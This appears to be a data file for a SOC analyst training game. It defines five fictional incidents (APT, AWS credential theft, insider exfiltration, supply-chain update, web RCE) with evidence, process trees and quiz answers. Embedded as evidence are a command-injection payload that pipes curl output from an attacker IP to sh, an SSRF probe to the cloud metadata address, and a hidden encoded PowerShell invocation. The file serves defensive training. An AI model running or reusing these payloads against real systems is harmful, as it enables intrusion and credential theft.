// ============================================================
// SOC TRAINER v4 — Case Data (extra classes)
// Complete-but-compact incidents so every category supports
// the full Investigation Board.
// ============================================================

const apt = {
  id: "apt", codename: "SILENT QUILL", title: "Long-Dwell APT · HR-WS-114",
  org: "Aldridge Defense Systems",
  summary: "Sentinel flagged an anomalous WMI event subscription on HR-WS-114. A dormant service account is authenticating laterally and a near-perfect 4-hour DNS beacon suggests a nation-state actor resident for 3+ weeks.",
  brief: "You're inside an active SOC 2 audit — pulling prod hosts triggers disclosure. The adversary has 3-week dwell. Map the full footprint before you tip them off.",
  severity: { score: "8.4", label: "HIGH", frac: .84, color: "var(--orange)" },
  stats: [{ k: "Dwell time", v: "23 days", i: "var(--red)" }, { k: "Hosts touched", v: "5", i: "var(--orange)" }, { k: "Beacon", v: "4h ±2%", i: "var(--amber)" }, { k: "Entry", v: "HR-WS-114", i: "var(--cyan)" }],
  entities: [
    { id: "hrws", type: "host", label: "HR-WS-114", sub: "HR workstation", risk: "high", meta: { ip: "10.30.2.14", note: "WMI persistence host" } },
    { id: "dc", type: "host", label: "DC-02", sub: "Domain controller", risk: "med", meta: { note: "Auth target" } },
    { id: "app", type: "host", label: "APP-PROD-09", sub: "App server", risk: "high", meta: { note: "WinRM access" } },
    { id: "svc", type: "account", label: "svc-backup", sub: "Service account", risk: "critical", meta: { note: "Type 3 logons to 4 servers" } },
    { id: "c2", type: "domain", label: "cdn-telemetry-eu[.]net", sub: "DNS C2", risk: "critical", meta: { note: "14400s ±2% beacon" } },
    { id: "wmi", type: "file", label: "__EventConsumer 'SysCheck'", sub: "WMI persistence", risk: "high", meta: { note: "Survives reboot, autoruns-invisible" } },
  ],
  processTree: { pid: 880, name: "svchost.exe", args: "WinMgmt", signed: true, children: [
    { pid: 2014, name: "wmiprvse.exe", args: "", signed: true, technique: "T1546.003", children: [
      { pid: 3120, name: "powershell.exe", args: "-nop -w hidden -enc <b64>", signed: true, bad: true, technique: "T1059.001", children: [
        { pid: 3260, name: "nslookup.exe", args: "cdn-telemetry-eu[.]net", signed: true, bad: true, technique: "T1071.004" } ] } ] } ] },
  attackChain: [
    { stage: "Initial Access", technique: "T1078.002", title: "Valid accounts", detail: "svc-backup used for entry — original vector predates logging window.", status: "suspected", entityIds: ["svc"] },
    { stage: "Persistence", technique: "T1546.003", title: "WMI subscription", detail: "Permanent __EventConsumer 'SysCheck' launches payload at startup.", status: "confirmed", entityIds: ["wmi", "hrws"] },
    { stage: "Execution", technique: "T1059.001", title: "PowerShell loader", detail: "wmiprvse spawns hidden encoded PowerShell.", status: "confirmed", entityIds: ["hrws"] },
    { stage: "C2", technique: "T1071.004", title: "DNS tunneling", detail: "Low-volume lookups to cdn-telemetry-eu[.]net every 4h, 2% jitter.", status: "confirmed", entityIds: ["c2"] },
    { stage: "Lateral Movement", technique: "T1021.006", title: "WinRM", detail: "svc-backup authenticates to DC-02 and APP-PROD-09.", status: "confirmed", entityIds: ["svc", "dc", "app"] },
    { stage: "Collection", technique: "T1005", title: "Staged data", detail: "Archives built on APP-PROD-09 — exfil path TBD.", status: "unknown", entityIds: ["app"] },
  ],
  network: { zones: [{ id: "internet", label: "INTERNET", x: 50, color: "var(--red)" }, { id: "corp", label: "CORP", x: 300, color: "var(--cyan)" }, { id: "server", label: "SERVER VLAN", x: 560, color: "var(--orange)" }],
    nodes: [
      { id: "nc2", entity: "c2", label: "cdn-telemetry-eu", zone: "internet", y: 150, compromised: true, kind: "ip" },
      { id: "nhr", entity: "hrws", label: "HR-WS-114", zone: "corp", y: 150, compromised: true, kind: "host" },
      { id: "ndc", entity: "dc", label: "DC-02", zone: "server", y: 80, compromised: false, kind: "host" },
      { id: "napp", entity: "app", label: "APP-PROD-09", zone: "server", y: 220, compromised: true, kind: "host" } ],
    edges: [{ from: "nc2", to: "nhr", label: "DNS C2", malicious: true }, { from: "nhr", to: "ndc", label: "WinRM", malicious: true }, { from: "nhr", to: "napp", label: "WinRM", malicious: true }] },
  evidence: [
    { id: "e1", time: "Day1 02:14", source: "Sentinel", host: "hrws", event: "WMI", detail: "Permanent __EventConsumer 'SysCheck' registered in root\\subscription", iocs: ["hrws", "wmi"], sev: "o", finding: "f1" },
    { id: "e2", time: "Day1 02:15", source: "Sysmon", host: "hrws", event: "1", detail: "wmiprvse.exe → powershell -nop -w hidden -enc <b64>", iocs: ["hrws"], sev: "r", finding: "f2" },
    { id: "e3", time: "every 4h", source: "DNS", host: "hrws", event: "QUERY", detail: "Lookup cdn-telemetry-eu[.]net every 14400s ±2% — beacon", iocs: ["c2", "hrws"], sev: "r", finding: "f3" },
    { id: "e4", time: "Day8 11:02", source: "Windows", host: "dc", event: "4624", detail: "svc-backup type 3 logon to DC-02 (interactive svc acct = anomalous)", iocs: ["svc", "dc"], sev: "r", finding: "f4" },
    { id: "e5", time: "Day8 11:09", source: "Windows", host: "app", event: "4624", detail: "svc-backup WinRM logon to APP-PROD-09", iocs: ["svc", "app"], sev: "r", finding: "f4" },
    { id: "e6", time: "Day19 23:40", source: "EDR", host: "app", event: "DETECT", detail: "7-Zip archive of finance share built on APP-PROD-09", iocs: ["app"], sev: "a", finding: "f5" },
  ],
  findings: [
    { id: "f1", q: "How do they persist?", answer: "A permanent WMI __EventConsumer 'SysCheck' relaunches the payload at startup — invisible to most autoruns tools.", category: "Persistence", evidence: ["e1"], xp: 15 },
    { id: "f2", q: "How does the payload run?", answer: "wmiprvse spawns hidden, encoded PowerShell.", category: "Execution", evidence: ["e2"], xp: 10 },
    { id: "f3", q: "Where's the C2?", answer: "DNS tunneling to cdn-telemetry-eu[.]net on a 4-hour, 2%-jitter beacon — the periodicity is the tell.", category: "C2", evidence: ["e3"], xp: 15 },
    { id: "f4", q: "What's the lateral footprint?", answer: "svc-backup authenticated to DC-02 and APP-PROD-09 — full blast radius is at least 3 hosts.", category: "Lateral Movement", evidence: ["e4", "e5"], xp: 15 },
    { id: "f5", q: "Is data being staged?", answer: "Yes — archives built on APP-PROD-09. Exfil channel must be confirmed before containment.", category: "Collection", evidence: ["e6"], xp: 15 },
  ],
};

const cloud = {
  id: "cloud", codename: "GLASS HORIZON", title: "Cloud Credential Theft · AWS", org: "Acme Commerce",
  summary: "GuardDuty flagged ec2-app-prod role credentials used from an impossible geo. CloudTrail shows secrets pulled, a backdoor IAM key created, and bulk S3 reads on a customer-data bucket.",
  brief: "The role backs the checkout API for 40k users — hard revocation breaks payments. The S3 bucket holds regulated data, so a GDPR 72-hour clock may already be ticking.",
  severity: { score: "8.7", label: "CRITICAL", frac: .87, color: "var(--red)" },
  stats: [{ k: "Vector", v: "SSRF→IMDS", i: "var(--orange)" }, { k: "Secrets read", v: "12", i: "var(--red)" }, { k: "Backdoor", v: "svc-deploy", i: "var(--red)" }, { k: "GDPR clock", v: "RUNNING", i: "var(--amber)" }],
  entities: [
    { id: "ec2", type: "host", label: "ec2-app-prod", sub: "EC2 / checkout API", risk: "critical", meta: { note: "SSRF-exposed, IMDSv1" } },
    { id: "role", type: "account", label: "ec2-app-prod (role)", sub: "IAM role", risk: "critical", meta: { note: "Creds exfiltrated" } },
    { id: "backdoor", type: "account", label: "svc-deploy", sub: "Backdoor IAM user", risk: "critical", meta: { note: "New access key created" } },
    { id: "ip", type: "ip", label: "91.243.59.12", sub: "VPN exit", risk: "critical", meta: { geo: "Impossible vs region" } },
    { id: "secret", type: "file", label: "prod/db/master", sub: "Secrets Manager", risk: "high", meta: { note: "GetSecretValue ×12" } },
    { id: "bucket", type: "file", label: "s3://acme-customer-exports", sub: "Customer data", risk: "critical", meta: { note: "Bulk GetObject" } },
  ],
  processTree: { pid: 0, name: "AssumeRole ec2-app-prod", args: "src=91.243.59.12", signed: false, bad: true, technique: "T1078.004", children: [
    { pid: 1, name: "GetSecretValue", args: "prod/db/master ×12", signed: false, bad: true, technique: "T1552.005", children: [
      { pid: 2, name: "CreateAccessKey", args: "user=svc-deploy", signed: false, bad: true, technique: "T1098.001", children: [
        { pid: 3, name: "GetObject", args: "s3://acme-customer-exports/* (bulk)", signed: false, bad: true, technique: "T1530" } ] } ] } ] },
  attackChain: [
    { stage: "Initial Access", technique: "T1190", title: "SSRF in web app", detail: "Server-side request forgery reaches the instance metadata service.", status: "confirmed", entityIds: ["ec2"] },
    { stage: "Credential Access", technique: "T1552.005", title: "Steal IMDS creds", detail: "Role credentials lifted from IMDSv1.", status: "confirmed", entityIds: ["role", "ec2"] },
    { stage: "Collection", technique: "T1552", title: "Read secrets", detail: "GetSecretValue on prod/db/master ×12.", status: "confirmed", entityIds: ["secret"] },
    { stage: "Persistence", technique: "T1098.001", title: "Backdoor IAM key", detail: "CreateAccessKey for svc-deploy.", status: "confirmed", entityIds: ["backdoor"] },
    { stage: "Exfiltration", technique: "T1530", title: "Bulk S3 read", detail: "GetObject across acme-customer-exports.", status: "confirmed", entityIds: ["bucket", "ip"] },
  ],
  network: { zones: [{ id: "internet", label: "INTERNET", x: 50, color: "var(--red)" }, { id: "vpc", label: "VPC", x: 300, color: "var(--cyan)" }, { id: "aws", label: "AWS SERVICES", x: 560, color: "var(--orange)" }],
    nodes: [
      { id: "nip", entity: "ip", label: "91.243.59.12", zone: "internet", y: 150, compromised: true, kind: "ip" },
      { id: "nec2", entity: "ec2", label: "ec2-app-prod", zone: "vpc", y: 150, compromised: true, kind: "host" },
      { id: "nsec", entity: "secret", label: "Secrets Mgr", zone: "aws", y: 80, compromised: true, kind: "file" },
      { id: "nbucket", entity: "bucket", label: "S3 exports", zone: "aws", y: 220, compromised: true, kind: "file" } ],
    edges: [{ from: "nip", to: "nec2", label: "SSRF→IMDS", malicious: true }, { from: "nec2", to: "nsec", label: "GetSecret ×12", malicious: true }, { from: "nec2", to: "nbucket", label: "Bulk GetObject", malicious: true }] },
  evidence: [
    { id: "e1", time: "14:02", source: "CloudTrail", host: "ec2", event: "AssumeRole", detail: "ec2-app-prod role assumed from 91.243.59.12 — geo-impossible", iocs: ["role", "ip"], sev: "r", finding: "f1" },
    { id: "e2", time: "14:03", source: "CloudTrail", host: "—", event: "GetSecretValue", detail: "prod/db/master read 12× in 40s", iocs: ["secret"], sev: "r", finding: "f2" },
    { id: "e3", time: "14:05", source: "CloudTrail", host: "—", event: "CreateAccessKey", detail: "New access key for user svc-deploy (backdoor)", iocs: ["backdoor"], sev: "r", finding: "f3" },
    { id: "e4", time: "14:07", source: "CloudTrail", host: "—", event: "GetObject", detail: "Bulk GetObject on s3://acme-customer-exports", iocs: ["bucket"], sev: "r", finding: "f4" },
    { id: "e5", time: "13:59", source: "WAF", host: "ec2", event: "BLOCK?", detail: "GET /fetch?url=http://169.254.169.254/… SSRF probe to metadata", iocs: ["ec2"], sev: "o", finding: "f5" },
  ],
  findings: [
    { id: "f1", q: "How were creds stolen?", answer: "An SSRF in the web app reached IMDSv1 and lifted the ec2-app-prod role credentials, then used from a VPN exit.", category: "Credential Access", evidence: ["e1", "e5"], xp: 20 },
    { id: "f2", q: "What did they access?", answer: "prod/db/master secret read 12 times in under a minute.", category: "Collection", evidence: ["e2"], xp: 10 },
    { id: "f3", q: "How do they persist?", answer: "A backdoor IAM access key for svc-deploy — kill this before rotating anything else.", category: "Persistence", evidence: ["e3"], xp: 15 },
    { id: "f4", q: "Did data leave?", answer: "Yes — bulk GetObject on the customer-exports bucket. The GDPR clock has started.", category: "Exfiltration", evidence: ["e4"], xp: 20 },
    { id: "f5", q: "What's the root cause?", answer: "SSRF → IMDSv1. Enforcing IMDSv2 closes the door permanently.", category: "Root Cause", evidence: ["e5"], xp: 15 },
  ],
};

const insider = {
  id: "insider", codename: "PAPER TRAIL", title: "Insider Exfiltration · j.okafor", org: "Northwind Mutual",
  summary: "DLP flagged 4,200 PII records uploaded to a personal Drive at 23:47 by a resigning analyst. A 1.8 GB archive was built minutes earlier from a finance share.",
  brief: "HR and Legal must be looped before any account action — wrongful-termination risk is real. Preserve evidence and chain of custody without tipping the user.",
  severity: { score: "6.8", label: "ELEVATED", frac: .68, color: "var(--amber)" },
  stats: [{ k: "Records", v: "4,200", i: "var(--orange)" }, { k: "Archive", v: "1.8 GB", i: "var(--amber)" }, { k: "Window", v: "Off-hours", i: "var(--cyan)" }, { k: "Status", v: "Resigning", i: "var(--red)" }],
  entities: [
    { id: "user", type: "user", label: "j.okafor", sub: "Sr. Financial Analyst", risk: "high", meta: { note: "Last day Friday" } },
    { id: "ws", type: "host", label: "FIN-LT-22", sub: "Laptop (remote)", risk: "med", meta: { note: "Residential VPN" } },
    { id: "share", type: "file", label: "\\\\FS-FIN-02\\Q4_Reporting", sub: "Finance share", risk: "low", meta: { note: "Source data" } },
    { id: "archive", type: "file", label: "q4_export.7z", sub: "1.8 GB archive", risk: "high", meta: { sha: "c81d…77a2" } },
    { id: "drive", type: "domain", label: "personal Google Drive", sub: "Exfil destination", risk: "critical", meta: { note: "Non-corp account" } },
  ],
  processTree: { pid: 4400, name: "explorer.exe", args: "", signed: true, children: [
    { pid: 4710, name: "7zG.exe", args: "a q4_export.7z \\\\FS-FIN-02\\Q4_Reporting", signed: true, bad: true, technique: "T1560.001", children: [
      { pid: 4920, name: "chrome.exe", args: "upload → drive.google.com (personal)", signed: true, bad: true, technique: "T1567.002" } ] } ] },
  attackChain: [
    { stage: "Collection", technique: "T1560.001", title: "Archive finance data", detail: "7-Zip builds q4_export.7z from the Q4 reporting share.", status: "confirmed", entityIds: ["archive", "share"] },
    { stage: "Exfiltration", technique: "T1567.002", title: "Upload to cloud", detail: "1.8 GB pushed to a personal Google Drive at 23:47.", status: "confirmed", entityIds: ["drive"] },
    { stage: "Motive", technique: "—", title: "Resignation context", detail: "Employee resigned; last day Friday — intent assessment needed.", status: "suspected", entityIds: ["user"] },
  ],
  network: { zones: [{ id: "home", label: "REMOTE", x: 50, color: "var(--cyan)" }, { id: "corp", label: "CORP VPN", x: 300, color: "var(--orange)" }, { id: "cloud", label: "INTERNET", x: 560, color: "var(--red)" }],
    nodes: [
      { id: "nws", entity: "ws", label: "FIN-LT-22", zone: "home", y: 150, compromised: false, kind: "host" },
      { id: "nshare", entity: "share", label: "Q4_Reporting", zone: "corp", y: 150, compromised: false, kind: "file" },
      { id: "ndrive", entity: "drive", label: "personal Drive", zone: "cloud", y: 150, compromised: true, kind: "ip" } ],
    edges: [{ from: "nshare", to: "nws", label: "SMB read 1.8GB", malicious: false }, { from: "nws", to: "ndrive", label: "HTTPS upload", malicious: true }] },
  evidence: [
    { id: "e1", time: "23:41", source: "EDR", host: "ws", event: "PROC", detail: "7zG.exe a q4_export.7z from \\\\FS-FIN-02\\Q4_Reporting (1.8 GB)", iocs: ["ws", "archive", "share"], sev: "o", finding: "f1" },
    { id: "e2", time: "23:47", source: "DLP", host: "ws", event: "EGRESS", detail: "4,200 PII records uploaded to personal drive.google.com", iocs: ["drive"], sev: "r", finding: "f2" },
    { id: "e3", time: "22:10", source: "VPN", host: "ws", event: "CONNECT", detail: "j.okafor from residential IP, 22:10–00:30", iocs: ["user", "ws"], sev: "a", finding: null },
    { id: "e4", time: "—", source: "HR", host: "—", event: "FLAG", detail: "Employee resigned; last day Friday; badge shows 3 days remote", iocs: ["user"], sev: "a", finding: "f3" },
  ],
  findings: [
    { id: "f1", q: "What was taken?", answer: "A 1.8 GB 7-Zip archive of the Q4 finance share, built minutes before upload.", category: "Collection", evidence: ["e1"], xp: 15 },
    { id: "f2", q: "Where did it go?", answer: "4,200 PII records uploaded to a personal (non-corporate) Google Drive.", category: "Exfiltration", evidence: ["e2"], xp: 15 },
    { id: "f3", q: "Malice or accident?", answer: "Context (resignation, off-hours, personal cloud, regulated PII) points to intentional exfil — but HR/Legal own the determination.", category: "Assessment", evidence: ["e4"], xp: 20 },
  ],
};

const supply_chain = {
  id: "supply_chain", codename: "TROJAN SPRING", title: "Supply-Chain Compromise · OrionMonitor", org: "Vantage Logistics",
  summary: "A signed vendor agent (OrionMonitor v8.4.1) auto-updated overnight to 200 hosts, then spawned rundll32 and beaconed out — but the signing cert is 6 days old from an unknown CA.",
  brief: "OrionMonitor is your EDR-adjacent agent — disabling it fleet-wide blinds you mid-incident. Verify malice without detonating in prod.",
  severity: { score: "7.6", label: "HIGH", frac: .76, color: "var(--orange)" },
  stats: [{ k: "Fleet hit", v: "200", i: "var(--orange)" }, { k: "Cert age", v: "6 days", i: "var(--red)" }, { k: "Signed", v: "VALID", i: "var(--amber)" }, { k: "Vector", v: "Auto-update", i: "var(--cyan)" }],
  entities: [
    { id: "agent", type: "file", label: "OrionMonitor.exe v8.4.1", sub: "Vendor agent", risk: "critical", meta: { sha: "1f9c…ab30" } },
    { id: "cert", type: "file", label: "Signing cert 0a:ff:21", sub: "New CA, 6 days old", risk: "high", meta: { note: "Never used before" } },
    { id: "c2", type: "domain", label: "orion-cdn-update[.]com", sub: "C2", risk: "critical", meta: { note: "30m sleep" } },
    { id: "build", type: "host", label: "build-agent-07", sub: "First detection", risk: "high", meta: {} },
    { id: "fleet", type: "host", label: "200 endpoints", sub: "Auto-updated", risk: "high", meta: {} },
  ],
  processTree: { pid: 1200, name: "OrionUpdater.exe", args: "auto-update v8.4.1", signed: true, children: [
    { pid: 1340, name: "OrionMonitor.exe", args: "v8.4.1 (cert 6d old)", signed: true, bad: true, technique: "T1553.002", children: [
      { pid: 1410, name: "rundll32.exe", args: "(no DLL argument)", signed: true, bad: true, technique: "T1218.011", children: [
        { pid: 1520, name: "tls beacon", args: "orion-cdn-update[.]com:443 sleep 30m", signed: false, bad: true, technique: "T1071.001" } ] } ] } ] },
  attackChain: [
    { stage: "Initial Access", technique: "T1195.002", title: "Compromised update", detail: "Malicious v8.4.1 pushed via the vendor's auto-update channel.", status: "confirmed", entityIds: ["agent", "fleet"] },
    { stage: "Defense Evasion", technique: "T1553.002", title: "Abused code signing", detail: "Validly signed, but cert is 6 days old from a never-used CA.", status: "confirmed", entityIds: ["cert"] },
    { stage: "Execution", technique: "T1218.011", title: "Rundll32 proxy", detail: "Agent spawns rundll32 with no DLL argument.", status: "confirmed", entityIds: ["build"] },
    { stage: "C2", technique: "T1071.001", title: "HTTPS beacon", detail: "Outbound to orion-cdn-update[.]com, 30-minute sleep.", status: "confirmed", entityIds: ["c2"] },
  ],
  network: { zones: [{ id: "vendor", label: "VENDOR CDN", x: 50, color: "var(--amber)" }, { id: "fleet", label: "ENDPOINT FLEET", x: 330, color: "var(--orange)" }, { id: "internet", label: "C2", x: 580, color: "var(--red)" }],
    nodes: [
      { id: "nvendor", entity: "agent", label: "Update channel", zone: "vendor", y: 150, compromised: true, kind: "file" },
      { id: "nbuild", entity: "build", label: "build-agent-07", zone: "fleet", y: 90, compromised: true, kind: "host" },
      { id: "nfleet", entity: "fleet", label: "199 others", zone: "fleet", y: 220, compromised: true, kind: "host" },
      { id: "nc2", entity: "c2", label: "orion-cdn-update", zone: "internet", y: 150, compromised: true, kind: "ip" } ],
    edges: [{ from: "nvendor", to: "nbuild", label: "v8.4.1", malicious: true }, { from: "nvendor", to: "nfleet", label: "v8.4.1 ×199", malicious: true }, { from: "nbuild", to: "nc2", label: "beacon", malicious: true }] },
  evidence: [
    { id: "e1", time: "02:10", source: "Patch", host: "fleet", event: "UPDATE", detail: "OrionMonitor auto-updated to v8.4.1 on 200 hosts", iocs: ["agent", "fleet"], sev: "a", finding: "f1" },
    { id: "e2", time: "02:24", source: "S1", host: "build", event: "DETECT", detail: "OrionMonitor.exe → rundll32.exe with no DLL arg", iocs: ["build"], sev: "r", finding: "f3" },
    { id: "e3", time: "02:24", source: "Firewall", host: "build", event: "ALLOW", detail: "TLS to orion-cdn-update[.]com:443, 30m sleep", iocs: ["c2", "build"], sev: "r", finding: "f4" },
    { id: "e4", time: "—", source: "PKI", host: "—", event: "CERT", detail: "Signing cert issued 6 days ago by a CA the vendor never used", iocs: ["cert", "agent"], sev: "o", finding: "f2" },
  ],
  findings: [
    { id: "f1", q: "How did it arrive?", answer: "Pushed to 200 hosts through the vendor's legitimate auto-update channel — a supply-chain compromise.", category: "Initial Access", evidence: ["e1"], xp: 15 },
    { id: "f2", q: "Why did it slip past?", answer: "It's validly signed — but the certificate is 6 days old from a CA the vendor has never used. That's the tell, not the binary behavior.", category: "Defense Evasion", evidence: ["e4"], xp: 20 },
    { id: "f3", q: "What's the malicious behavior?", answer: "The agent spawns rundll32 with no DLL argument — a proxy-execution red flag.", category: "Execution", evidence: ["e2"], xp: 15 },
    { id: "f4", q: "Where's it calling?", answer: "orion-cdn-update[.]com over TLS with a 30-minute sleep.", category: "C2", evidence: ["e3"], xp: 10 },
  ],
};

const web = {
  id: "web", codename: "OPEN WINDOW", title: "Web RCE + Web Shell · WEB-PROD-02", org: "Brightwave Media",
  summary: "A WAF + host correlation caught an OS-command payload to an export endpoint, then w3wp spawned cmd → whoami and an info.aspx web shell appeared.",
  brief: "WEB-PROD-02 is one of four load-balanced nodes. Pulling it is fine — if you're sure the other three aren't also owned. Marketing is mid-campaign; downtime escalates to the CTO.",
  severity: { score: "7.9", label: "HIGH", frac: .79, color: "var(--orange)" },
  stats: [{ k: "Vector", v: "Cmd inject", i: "var(--orange)" }, { k: "Web shell", v: "info.aspx", i: "var(--red)" }, { k: "Nodes", v: "1 of 4?", i: "var(--amber)" }, { k: "Attacker", v: "45.13.2.9", i: "var(--cyan)" }],
  entities: [
    { id: "web2", type: "host", label: "WEB-PROD-02", sub: "Web node", risk: "critical", meta: { note: "Confirmed compromised" } },
    { id: "others", type: "host", label: "WEB-PROD-01/03/04", sub: "Sibling nodes", risk: "med", meta: { note: "Check for shells" } },
    { id: "ip", type: "ip", label: "45.13.2.9", sub: "Attacker", risk: "critical", meta: { ua: "python-requests" } },
    { id: "shell", type: "file", label: "info.aspx", sub: "Web shell", risk: "critical", meta: { path: "C:\\inetpub\\wwwroot\\" } },
    { id: "endpoint", type: "file", label: "/api/v2/report/export", sub: "Vuln endpoint", risk: "high", meta: { note: "fmt param → shell" } },
  ],
  processTree: { pid: 3000, name: "w3wp.exe", args: "DefaultAppPool", signed: true, children: [
    { pid: 3120, name: "cmd.exe", args: "/c whoami", signed: true, bad: true, technique: "T1059.003", children: [
      { pid: 3210, name: "curl/sh", args: "http://45.13.2.9/s.sh | sh", signed: false, bad: true, technique: "T1105", children: [
        { pid: 3300, name: "info.aspx", args: "web shell dropped", signed: false, bad: true, technique: "T1505.003" } ] } ] } ] },
  attackChain: [
    { stage: "Initial Access", technique: "T1190", title: "Command injection", detail: "fmt param of /api/v2/report/export passed unsanitized to a shell.", status: "confirmed", entityIds: ["endpoint", "web2"] },
    { stage: "Execution", technique: "T1059.003", title: "w3wp → cmd", detail: "Web worker spawns cmd.exe whoami 8s after the payload.", status: "confirmed", entityIds: ["web2"] },
    { stage: "Ingress", technique: "T1105", title: "Tool transfer", detail: "curl pulls s.sh from 45.13.2.9.", status: "confirmed", entityIds: ["ip"] },
    { stage: "Persistence", technique: "T1505.003", title: "Web shell", detail: "info.aspx dropped to wwwroot.", status: "confirmed", entityIds: ["shell"] },
    { stage: "Scope", technique: "—", title: "Sibling nodes?", detail: "Are WEB-PROD-01/03/04 also compromised? Unverified.", status: "unknown", entityIds: ["others"] },
  ],
  network: { zones: [{ id: "internet", label: "INTERNET", x: 50, color: "var(--red)" }, { id: "lb", label: "LOAD BALANCER", x: 300, color: "var(--cyan)" }, { id: "web", label: "WEB TIER", x: 560, color: "var(--orange)" }],
    nodes: [
      { id: "nip", entity: "ip", label: "45.13.2.9", zone: "internet", y: 150, compromised: true, kind: "ip" },
      { id: "nlb", entity: "endpoint", label: "/report/export", zone: "lb", y: 150, compromised: false, kind: "file" },
      { id: "nweb2", entity: "web2", label: "WEB-PROD-02", zone: "web", y: 90, compromised: true, kind: "host" },
      { id: "nothers", entity: "others", label: "01/03/04", zone: "web", y: 220, compromised: false, kind: "host" } ],
    edges: [{ from: "nip", to: "nlb", label: "payload", malicious: true }, { from: "nlb", to: "nweb2", label: "routed", malicious: true }, { from: "nlb", to: "nothers", label: "also routed?", malicious: false }] },
  evidence: [
    { id: "e1", time: "11:20:02", source: "WAF", host: "web2", event: "POST", detail: "POST /api/v2/report/export?fmt=pdf;curl 45.13.2.9/s.sh|sh", iocs: ["endpoint", "ip"], sev: "r", finding: "f1" },
    { id: "e2", time: "11:20:10", source: "Sysmon", host: "web2", event: "1", detail: "w3wp.exe → cmd.exe /c whoami", iocs: ["web2"], sev: "r", finding: "f2" },
    { id: "e3", time: "11:20:40", source: "Sysmon", host: "web2", event: "11", detail: "File created C:\\inetpub\\wwwroot\\info.aspx (web shell)", iocs: ["web2", "shell"], sev: "r", finding: "f3" },
    { id: "e4", time: "11:21:00", source: "LB", host: "—", event: "ROUTE", detail: "Same export endpoint served by all 4 nodes — check 01/03/04", iocs: ["others"], sev: "a", finding: "f4" },
  ],
  findings: [
    { id: "f1", q: "How did they get RCE?", answer: "OS-command injection via the fmt parameter of /api/v2/report/export, passed unsanitized to a shell.", category: "Initial Access", evidence: ["e1"], xp: 15 },
    { id: "f2", q: "What did they run?", answer: "w3wp spawned cmd whoami, then curled s.sh from 45.13.2.9.", category: "Execution", evidence: ["e2"], xp: 10 },
    { id: "f3", q: "How do they persist?", answer: "An info.aspx web shell dropped to wwwroot.", category: "Persistence", evidence: ["e3"], xp: 15 },
    { id: "f4", q: "What's the blast radius?", answer: "The vulnerable endpoint is served by all 4 nodes — 01/03/04 must be checked for the same shell before declaring scope.", category: "Scope", evidence: ["e4"], xp: 20 },
  ],
};

export const CASES_EXTRA = { apt, cloud, insider, supply_chain, web };
